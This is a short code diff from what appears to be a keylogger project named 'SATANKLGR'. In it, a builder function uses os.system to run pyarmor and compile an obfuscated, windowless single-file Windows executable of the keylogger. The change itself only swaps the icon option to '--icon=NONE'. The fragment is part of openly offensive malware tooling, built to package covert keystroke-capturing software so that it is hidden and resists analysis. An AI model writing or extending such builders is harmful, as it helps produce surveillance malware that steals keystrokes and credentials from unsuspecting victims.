@@ -32,7 +32,7 @@ def pyw_exe():
         try:
             print(Fore.YELLOW+"[*] Compiling obfuscated .exe file...")
             print(Fore.RESET+"")
-            os.system('pyarmor pack --clean -e "--onefile --windowed --icon default.ico" SATANKLGR.py')
+            os.system('pyarmor pack --clean -e "--onefile --windowed --icon=NONE" SATANKLGR.py')
             print(Fore.GREEN+"[*] The file SATANKLGR.exe is successfully compiled and saved in dist folder √")
             try:
                 print(Fore.YELLOW+"[*] Removing needless foulders...")
